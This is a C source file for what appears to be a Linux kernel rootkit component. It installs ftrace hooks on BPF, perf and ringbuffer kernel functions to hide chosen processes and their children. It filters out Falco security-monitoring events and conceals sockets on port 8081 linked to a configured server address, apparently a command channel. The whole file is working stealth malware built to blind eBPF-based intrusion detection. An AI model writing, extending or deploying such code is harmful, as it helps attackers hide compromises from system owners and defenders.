#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/bpf_hook.h"

#define HIDDEN_PORT 8081

static __be32 hidden_ip_cached = 0;

static inline void init_hidden_ip(void)
{
    if (unlikely(hidden_ip_cached == 0))
        hidden_ip_cached = in_aton(YOUR_SRV_IP);
}

struct bpf_iter_ctx_tcp {
    struct bpf_iter_meta *meta;
    struct sock_common *sk_common;
    uid_t uid;
};

struct bpf_iter_ctx_udp {
    struct bpf_iter_meta *meta;
    struct udp_sock *udp_sk;
    uid_t uid;
    int bucket;
};

struct bpf_iter_ctx_task {
    struct bpf_iter_meta *meta;
    struct task_struct *task;
};

static notrace bool should_hide_socket_port(struct sock_common *sk)
{
    __be16 sport, dport;
    __be32 saddr, daddr;
    
    if (!sk)
        return false;
    
    init_hidden_ip();
    
    if (sk->skc_family == AF_INET) {
        sport = sk->skc_num;
        dport = sk->skc_dport;
        saddr = sk->skc_rcv_saddr;
        daddr = sk->skc_daddr;
        
        if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) {
            if (saddr == hidden_ip_cached || daddr == hidden_ip_cached ||
                saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) {
                return true;
            }
        }
    }
    else if (sk->skc_family == AF_INET6) {
        sport = sk->skc_num;
        
        if (sport == HIDDEN_PORT) {
            return true;
        }
    }
    
    return false;
}

static notrace inline bool should_hide_pid_by_int(int pid)
{
    int i;
    if (pid <= 0)
        return false;

    if (hidden_count < 0 || hidden_count > MAX_HIDDEN_PIDS)
        return false;

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return true;
    }
    return false;
}

static notrace bool is_child_of_hidden_process(int pid)
{
    struct task_struct *task;
    struct task_struct *parent;
    int depth = 0;
    int max_depth = 10;
    bool hidden = false;
    
    if (pid <= 0)
        return false;
    
    if (should_hide_pid_by_int(pid))
        return true;
    
    rcu_read_lock();
    
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    
    if (!task) {
        rcu_read_unlock();
        return false;
    }
    
    parent = task;
    while (parent && depth < max_depth) {
        if (parent->pid <= 0)
            break;
        
        parent = rcu_dereference(parent->real_parent);
        
        if (!parent || parent->pid <= 1)
            break;
        
        if (should_hide_pid_by_int(parent->pid)) {
            hidden = true;
            break;
        }
        
        depth++;
    }
    
    rcu_read_unlock();
    return hidden;
}

static int (*orig_bpf_iter_run_prog)(struct bpf_prog *prog, void *ctx) = NULL;

static notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx)
{
    struct bpf_iter_ctx_tcp *tcp_ctx;
    struct bpf_iter_ctx_udp *udp_ctx;
    struct bpf_iter_ctx_task *task_ctx;
    struct sock_common *sk;
    struct udp_sock *udp_sk;
    struct task_struct *task;
    
    if (!orig_bpf_iter_run_prog || !ctx)
        goto passthrough;
    
    tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx;
    if (tcp_ctx && tcp_ctx->sk_common) {
        sk = tcp_ctx->sk_common;
        
        if ((unsigned long)sk > PAGE_SIZE) {
            if (should_hide_socket_port(sk)) {
                return 0;
            }
        }
    }
    
    udp_ctx = (struct bpf_iter_ctx_udp *)ctx;
    if (udp_ctx && udp_ctx->udp_sk) {
        udp_sk = udp_ctx->udp_sk;
        
        if ((unsigned long)udp_sk > PAGE_SIZE) {
            sk = &udp_sk->inet.sk.__sk_common;
            
            if (should_hide_socket_port(sk)) {
                return 0;
            }
        }
    }
    
    task_ctx = (struct bpf_iter_ctx_task *)ctx;
    if (task_ctx && task_ctx->task) {
        task = task_ctx->task;
        
        if ((unsigned long)task > PAGE_SIZE && task->pid > 0) {
            if (is_child_of_hidden_process(task->pid)) {
                return 0;
            }
        }
    }
    
passthrough:
    return orig_bpf_iter_run_prog(prog, ctx);
}

static int (*orig_bpf_seq_write)(struct seq_file *seq, const void *data, u32 len) = NULL;

static notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len)
{
    const u32 *pid_data;
    int i;
    
    if (!orig_bpf_seq_write)
        return -ENOSYS;
    
    if (!data || len < sizeof(u32))
        goto passthrough;
    
    pid_data = (const u32 *)data;
    for (i = 0; i < (len / sizeof(u32)) && i < 16; i++) {
        u32 potential_pid = pid_data[i];
        
        if (potential_pid > 0 && potential_pid < 4194304) {
            if (is_child_of_hidden_process((int)potential_pid)) {
                return 0;
            }
        }
    }
    
passthrough:
    return orig_bpf_seq_write(seq, data, len);
}

static int (*orig_bpf_seq_printf)(struct seq_file *m, const char *fmt, u32 fmt_size, 
                                   const void *data, u32 data_len) = NULL;

static notrace int hook_bpf_seq_printf(struct seq_file *m, const char *fmt, u32 fmt_size,
                                       const void *data, u32 data_len)
{
    const u32 *pid_data;
    int i;
    
    if (!orig_bpf_seq_printf)
        return -ENOSYS;
    
    if (!data || data_len < sizeof(u32))
        goto passthrough;
    
    pid_data = (const u32 *)data;
    for (i = 0; i < (data_len / sizeof(u32)) && i < 16; i++) {
        u32 potential_pid = pid_data[i];
        
        if (potential_pid > 0 && potential_pid < 4194304) {
            if (is_child_of_hidden_process((int)potential_pid)) {
                return 0;
            }
        }
    }
    
passthrough:
    return orig_bpf_seq_printf(m, fmt, fmt_size, data, data_len);
}

struct falco_event_hdr {
    u64 ts;
    u64 tid;
    u32 len;
    u16 type;
    u32 nparams;
} __attribute__((packed));

static notrace bool is_falco_event(void *data, u64 size)
{
    struct falco_event_hdr *hdr;
    
    if (!data || size < sizeof(struct falco_event_hdr))
        return false;
    
    hdr = (struct falco_event_hdr *)data;
    
    if (hdr->type >= 1 && hdr->type <= 400 &&
        hdr->len > 0 && hdr->len < 65536 &&
        hdr->nparams < 20) {
        return true;
    }
    
    return false;
}

static long (*orig_bpf_ringbuf_output)(void *ringbuf, void *data, u64 size, u64 flags) = NULL;

static notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags)
{
    struct falco_event_hdr *hdr;
    int pid;
    
    if (!orig_bpf_ringbuf_output)
        return -ENOSYS;
    
    if (!data || !ringbuf)
        goto passthrough;
    
    if (!is_falco_event(data, size))
        goto passthrough;
    
    hdr = (struct falco_event_hdr *)data;
    pid = (int)(hdr->tid & 0xFFFFFFFF);
    
    if (is_child_of_hidden_process(pid)) {
        return 0;
    }
    
passthrough:
    return orig_bpf_ringbuf_output(ringbuf, data, size, flags);
}

static void *(*orig_bpf_ringbuf_reserve)(void *ringbuf, u64 size, u64 flags) = NULL;

static notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags)
{
    pid_t pid;
    
    if (!orig_bpf_ringbuf_reserve)
        return NULL;
    
    pid = current->tgid;
    
    if (is_child_of_hidden_process(pid)) {
        return NULL;
    }
    
    return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
}

static void *(*orig_bpf_ringbuf_submit)(void *data, u64 flags) = NULL;

static notrace void hook_bpf_ringbuf_submit(void *data, u64 flags)
{
    struct falco_event_hdr *hdr;
    int pid;
    
    if (!orig_bpf_ringbuf_submit)
        return;
    
    if (!data)
        goto passthrough;
    
    if (!is_falco_event(data, 0))
        goto passthrough;
    
    hdr = (struct falco_event_hdr *)data;
    pid = (int)(hdr->tid & 0xFFFFFFFF);
    
    if (is_child_of_hidden_process(pid)) {
        return;
    }
    
passthrough:
    orig_bpf_ringbuf_submit(data, flags);
}

static void *(*orig_bpf_map_lookup_elem)(struct bpf_map *map, const void *key) = NULL;

static notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key)
{
    void *ret;
    pid_t pid;
    
    if (!orig_bpf_map_lookup_elem)
        return NULL;
    
    ret = orig_bpf_map_lookup_elem(map, key);
    
    if (ret && map && map->key_size == sizeof(pid_t)) {
        pid = *(pid_t *)key;
        
        if (is_child_of_hidden_process(pid)) {
            return NULL;
        }
    }
    
    return ret;
}

static long (*orig_bpf_map_update_elem)(struct bpf_map *map, void *key,
                                         void *value, u64 flags) = NULL;

static notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key,
                                               void *value, u64 flags)
{
    u32 *pid_key;
    
    if (!orig_bpf_map_update_elem)
        return -ENOSYS;
    
    if (map && map->key_size == sizeof(u32)) {
        pid_key = (u32 *)key;
        
        if (is_child_of_hidden_process((int)*pid_key)) {
            return 0;
        }
    }
    
    return orig_bpf_map_update_elem(map, key, value, flags);
}

static int (*orig_perf_event_output)(struct perf_event *event, 
                                      struct perf_sample_data *data,
                                      struct pt_regs *regs) = NULL;

static notrace int hook_perf_event_output(struct perf_event *event, 
                                          struct perf_sample_data *data,
                                          struct pt_regs *regs)
{
    pid_t pid;
    
    if (!orig_perf_event_output)
        return -ENOSYS;
    
    pid = current->tgid;
    
    if (is_child_of_hidden_process(pid)) {
        return 0;
    }
    
    return orig_perf_event_output(event, data, regs);
}

static void (*orig_perf_trace_run_bpf_submit)(void *raw_data, int size,
                                               int rctx, struct pt_regs *regs,
                                               struct hlist_head *head,
                                               struct task_struct *task) = NULL;

static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
                                                    int rctx, struct pt_regs *regs,
                                                    struct hlist_head *head,
                                                    struct task_struct *task)
{
    if (!orig_perf_trace_run_bpf_submit)
        return;
    
    if (task && is_child_of_hidden_process(task->pid)) {
        return;
    }
    
    if (is_child_of_hidden_process(current->tgid)) {
        return;
    }
    
    orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task);
}

static u32 (*orig_bpf_prog_run)(const struct bpf_prog *prog, const void *ctx) = NULL;

static notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx)
{
    pid_t pid;
    
    if (!orig_bpf_prog_run)
        return 0;
    
    pid = current->tgid;
    
    if (is_child_of_hidden_process(pid)) {
        return 0;
    }
    
    return orig_bpf_prog_run(prog, ctx);
}

static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static asmlinkage long (*orig_bpf_ia32)(const struct pt_regs *);

static notrace asmlinkage long hook_bpf(const struct pt_regs *regs)
{
    int cmd;
    pid_t pid;

    if (!orig_bpf)
        return -ENOSYS;

    cmd = (int)regs->di;
    pid = current->tgid;
    
    if (is_child_of_hidden_process(pid)) {
    }

    return orig_bpf(regs);
}

static notrace asmlinkage long hook_bpf_ia32(const struct pt_regs *regs)
{
    int cmd;
    pid_t pid;

    if (!orig_bpf_ia32)
        return -ENOSYS;

    cmd = (int)regs->bx;
    pid = current->tgid;
    
    if (is_child_of_hidden_process(pid)) {
    }

    return orig_bpf_ia32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("bpf_iter_run_prog", hook_bpf_iter_run_prog, &orig_bpf_iter_run_prog),
    HOOK("bpf_seq_write", hook_bpf_seq_write, &orig_bpf_seq_write),
    HOOK("bpf_seq_printf", hook_bpf_seq_printf, &orig_bpf_seq_printf),
    HOOK("bpf_ringbuf_output", hook_bpf_ringbuf_output, &orig_bpf_ringbuf_output),
    HOOK("bpf_ringbuf_reserve", hook_bpf_ringbuf_reserve, &orig_bpf_ringbuf_reserve),
    HOOK("bpf_ringbuf_submit", hook_bpf_ringbuf_submit, &orig_bpf_ringbuf_submit),
    HOOK("bpf_map_lookup_elem", hook_bpf_map_lookup_elem, &orig_bpf_map_lookup_elem),
    HOOK("bpf_map_update_elem", hook_bpf_map_update_elem, &orig_bpf_map_update_elem),
    HOOK("perf_event_output", hook_perf_event_output, &orig_perf_event_output),
    HOOK("perf_trace_run_bpf_submit", hook_perf_trace_run_bpf_submit, 
         &orig_perf_trace_run_bpf_submit),
    HOOK("__bpf_prog_run", hook_bpf_prog_run, &orig_bpf_prog_run),
    HOOK("__x64_sys_bpf", hook_bpf, &orig_bpf),
    HOOK("__ia32_sys_bpf", hook_bpf_ia32, &orig_bpf_ia32),
};

notrace int bpf_hook_init(void)
{
    int ret, installed = 0, i;
    
    init_hidden_ip();
    
    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        ret = fh_install_hook(&hooks[i]);
        if (ret == 0)
            installed++;
    }
    
    if (installed == 0)
        return -ENOENT;
    
    return 0;
}

notrace void bpf_hook_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
